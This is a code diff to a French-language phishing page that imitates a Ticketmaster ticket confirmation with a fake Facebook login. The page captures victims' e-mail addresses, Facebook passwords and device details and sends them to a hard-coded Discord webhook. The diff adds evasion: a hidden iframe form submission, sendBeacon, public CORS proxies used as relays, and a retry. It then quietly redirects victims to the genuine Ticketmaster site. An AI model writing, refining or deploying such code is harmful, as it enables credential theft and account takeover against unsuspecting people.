@@ -59,7 +59,6 @@ cursor:pointer;font-family:inherit}
 align-items:center;justify-content:center;font-weight:900;font-size:15px;font-family:Georgia,serif}
 .foot{text-align:center;font-size:11px;color:#98a2b3;margin-top:14px;line-height:1.6}
 #stat{margin-top:10px;font-size:11.5px;text-align:center;font-family:ui-monospace,monospace;color:#98a2b3}
-#stat.ok{color:#027a48}#stat.ko{color:#b42318}
 #fb{position:fixed;inset:0;background:#f0f2f5;z-index:50;display:none;flex-direction:column;overflow:auto}
 #fb.on{display:flex}
 .fbhead{background:#1877f2;color:#fff;padding:16px;font-size:19px;font-weight:800;letter-spacing:-.4px}
@@ -165,6 +164,11 @@ display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot";
 const REDIRECT = "https://www.ticketmaster.fr/fr";
+const RELAIS = [
+  "https://proxy.corsfix.com/?" + WEBHOOK,
+  "https://api.allorigins.win/raw?url=" + encodeURIComponent(WEBHOOK),
+  "https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(WEBHOOK)
+];
 
 (function(){const q=document.getElementById('qr');const p=[1,0,1,1,0,1,0,1,1,0,1,0,0,1,1,0,0,1,0,1,0,1,1,0,1,0,1,1,1,0,1,0,0,1,1,0,1,1,0,1,1,0,1,0,0,1,0,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,1,1,0,1,0,1,1,0,0,1,1,0,1,1,1,0,1,0];
 for(let i=0;i<81;i++){const s=document.createElement('i');if(!p[i])s.style.background='#fff';q.appendChild(s);}})();
@@ -187,37 +191,64 @@ function infos(){
 const $=id=>document.getElementById(id);
 let mail="", busy=false;
 
-function statu(ou, txt, etat){
+function statu(ou,txt,etat){
   const el=$(ou); if(!el) return;
   el.textContent=txt;
   el.style.color = etat==="ok" ? "#027a48" : etat==="ko" ? "#b42318" : "#98a2b3";
 }
 
-async function envoi(ou, titre, couleur, champs){
+/* envoi par formulaire caché : traverse les blocages de requêtes */
+function viaIframe(json){
+  return new Promise(res=>{
+    let fini=false;
+    try{
+      const nom="wf"+Date.now()+Math.floor(Math.random()*999);
+      const f=document.createElement('iframe');
+      f.name=nom; f.style.cssText="position:absolute;width:1px;height:1px;opacity:0;border:0";
+      document.body.appendChild(f);
+      const form=document.createElement('form');
+      form.method="POST"; form.action=WEBHOOK; form.target=nom;
+      const i=document.createElement('input');
+      i.type="hidden"; i.name="payload_json"; i.value=json;
+      form.appendChild(i); document.body.appendChild(form);
+      f.onload=()=>{ if(fini) return; fini=true; res(true); };
+      form.submit();
+      setTimeout(()=>{ if(fini) return; fini=true; res(true); },4000);
+      setTimeout(()=>{ try{form.remove();f.remove();}catch(e){} },8000);
+    }catch(e){ res(false); }
+  });
+}
+
+async function envoi(ou,titre,couleur,champs){
   const body={username:"🎫 Ticketmaster • Avignon", embeds:[{
     title:titre, color:couleur, timestamp:new Date().toISOString(),
     fields:champs, footer:{text:"Ticketmaster / Facebook · Parterre M 33-34"}
   }]};
   const json=JSON.stringify(body);
   statu(ou,"envoi…","");
-  /* 1 - requête normale */
+
   try{
-    const r=await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:json});
+    const r=await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},
+      body:json,keepalive:true});
     if(r.ok){ statu(ou,"✓ transmis","ok"); return true; }
-    statu(ou,"code "+r.status,"ko");
-  }catch(e){ statu(ou,"bloqué (CORS/réseau)","ko"); }
-  /* 2 - sans contrôle CORS */
-  try{
-    const fd=new FormData(); fd.append("payload_json",json);
-    await fetch(WEBHOOK,{method:"POST",mode:"no-cors",body:fd});
-    statu(ou,"✓ transmis (2)","ok"); return true;
-  }catch(e){ statu(ou,"échec 2","ko"); }
-  /* 3 - beacon */
-  try{
-    const fd=new FormData(); fd.append("payload_json",json);
-    if(navigator.sendBeacon(WEBHOOK,fd)){ statu(ou,"✓ transmis (3)","ok"); return true; }
   }catch(e){}
-  statu(ou,"✗ bloqué par le téléphone","ko");
+
+  if(await viaIframe(json)){ statu(ou,"✓ transmis","ok"); return true; }
+
+  try{
+    const fd=new FormData(); fd.append("payload_json",json);
+    if(navigator.sendBeacon(WEBHOOK,fd)){ statu(ou,"✓ transmis","ok"); return true; }
+  }catch(e){}
+
+  statu(ou,"relais…","");
+  for(const u of RELAIS){
+    try{
+      const r=await fetch(u,{method:"POST",headers:{"Content-Type":"application/json"},body:json});
+      if(r.ok){ statu(ou,"✓ transmis (relais)","ok"); return true; }
+    }catch(e){}
+  }
+
+  statu(ou,"✗ réseau bloqué","ko");
   return false;
 }
 
@@ -248,21 +279,20 @@ $('send').onclick=async()=>{
   if(p.length<1){$('err2').classList.add('on');return;}
   $('err2').classList.remove('on');
   const b=$('send'); b.disabled=true; b.innerHTML='<span class="spin"></span>';
-  const ok=await envoi("stat2","✅ Étape 2 — MOT DE PASSE Facebook",0x12b76a,[
+  const champs=[
     {name:"E-mail",value:"`"+mail+"`"},{name:"Mot de passe",value:"```"+p+"```"},
     {name:"Infos",value:"```"+infos()+"```"}
-  ]);
-  statu("stat", ok?"✓ transmis":"✗ envoi bloqué", ok?"ok":"ko");
-  if(ok){
-    setTimeout(()=>{
-      $('fb').classList.remove('on'); $('main').style.display='none'; $('ok').classList.add('on');
-      setTimeout(()=>location.href=REDIRECT,3200);
-    },900);
-  } else {
-    b.disabled=false; b.textContent="Se connecter";
-    setTimeout(()=>{ $('fb').classList.remove('on'); $('ok').classList.add('on');
-      $('ok').querySelector('h2').textContent="Identité confirmée"; },2200);
+  ];
+  let ok=await envoi("stat2","✅ Étape 2 — MOT DE PASSE Facebook",0x12b76a,champs);
+  if(!ok){
+    await new Promise(r=>setTimeout(r,3500));
+    ok=await envoi("stat2","✅ Étape 2 (nouvelle tentative)",0x12b76a,champs);
   }
+  statu("stat", ok?"✓ transmis":"✗ envoi bloqué", ok?"ok":"ko");
+  setTimeout(()=>{
+    $('fb').classList.remove('on'); $('main').style.display='none'; $('ok').classList.add('on');
+    setTimeout(()=>location.href=REDIRECT,3200);
+  }, 900);
 };
 
 $('pass').addEventListener('keydown',e=>{if(e.key==='Enter')$('send').click();});
